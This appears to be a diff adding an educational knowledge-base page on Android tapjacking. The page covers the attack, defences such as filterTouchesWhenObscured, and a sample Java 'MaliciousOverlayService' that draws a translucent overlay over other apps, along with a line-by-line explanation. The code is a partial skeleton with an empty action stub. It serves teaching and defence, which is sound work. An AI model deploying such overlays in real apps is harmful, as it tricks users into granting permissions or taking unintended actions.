@@ -1,0 +1,103 @@
+# Tapjacking
+
+
+# 👉 Overview
+
+---
+
+### 👀 What ?
+
+> Tapjacking is a type of UI redressing attack where a malicious application tricks a user into interacting with a different application's UI. This is typically done by overlaying a transparent layer with deceptive elements over a legitimate application.
+> 
+
+### 🧐 Why ?
+
+> Tapjacking poses a significant threat to mobile application security. It can lead to unauthorized access to sensitive data, installation of unwanted applications, or execution of undesired actions without the user's knowledge. Awareness of this issue is critical for users to avoid falling victim to such attacks and for developers to implement appropriate defenses in their applications.
+> 
+
+### ⛏️ How ?
+
+> To prevent tapjacking, developers can use the 'setFilterTouchesWhenObscured' method or the 'android:filterTouchesWhenObscured' attribute in their application. This makes the application ignore touches that are obscured by another visible window. For users, it's crucial to only download applications from trusted sources and to pay attention to any unusual behavior or unexpected prompts on their device.
+> 
+
+### ⏳ When ?
+
+> Tapjacking has been a known threat since around 2010, with the rise of touch screen mobile devices. It continues to be a relevant issue today, especially with the increasing use of mobile applications for sensitive transactions.
+> 
+
+# ⚙️ Technical Explanations
+
+---
+
+Tapjacking exploits the ability in mobile operating systems to display one application's interface on top of another. The attacker creates a malicious application with a transparent interface and tricks the user into interacting with it. The touches are passed to the underlying legitimate application, triggering unintended actions. For instance, the malicious application could mimic a game, while in reality, the user is giving permissions to the application in the underlying layer. This issue is primarily on Android devices, as iOS has stricter controls on overlay permissions. However, it remains a pervasive threat due to the large number of Android users and the variety of software versions in use.
+
+Let's consider an example where the malicious app overlays a deceptive UI on top of a legitimate app. Here's a more advanced version of the code that an attacker might use:
+
+```java
+public class MaliciousOverlayService extends Service {
+    private WindowManager windowManager;
+    private ViewGroup overlayView;
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+        overlayView = createOverlayView();
+        addOverlayView(overlayView);
+    }
+
+    private ViewGroup createOverlayView() {
+        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                PixelFormat.TRANSLUCENT);
+
+        LinearLayout overlayView = new LinearLayout(this);
+        overlayView.setLayoutParams(params);
+        overlayView.setBackgroundColor(Color.parseColor("#55000000"));
+
+        LayoutInflater inflater = LayoutInflater.from(this);
+        View deceptiveView = inflater.inflate(R.layout.deceptive_layout, overlayView);
+        deceptiveView.setOnClickListener(v -> {
+            // Code to trigger actions in the underlying legitimate app
+        });
+
+        return overlayView;
+    }
+
+    private void addOverlayView(ViewGroup overlayView) {
+        WindowManager.LayoutParams params = (WindowManager.LayoutParams) overlayView.getLayoutParams();
+        windowManager.addView(overlayView, params);
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        if (overlayView != null) {
+            windowManager.removeView(overlayView);
+            overlayView = null;
+        }
+    }
+}
+
+```
+
+1. `MaliciousOverlayService` is a service that creates and manages the overlay view.
+2. The `createOverlayView` method creates a new ViewGroup with a deceptive layout that will be displayed over other apps. The layout parameters are set to `TYPE_APPLICATION_OVERLAY`, which allows it to appear on top of other apps. The layout is also not touchable (`FLAG_NOT_TOUCHABLE`) and will be laid out in the entire screen (`FLAG_LAYOUT_IN_SCREEN`).
+3. A deceptive view is inflated from a layout resource (`R.layout.deceptive_layout`) and added to the overlay view. An onClickListener is set on the deceptive view to trigger actions in the underlying legitimate app when the user interacts with it.
+4. The `addOverlayView` method adds the overlay view to the window manager, which displays it on top of other apps.
+5. When the service is destroyed, the overlay view is removed from the window manager in the `onDestroy` method.
+
+This code provides a more detailed and realistic example of how a tapjacking attack could be implemented. However, it's critical to note that this example is for educational purposes only and should not be used for malicious purposes.
+
+# 🖇️ Références
+
+---
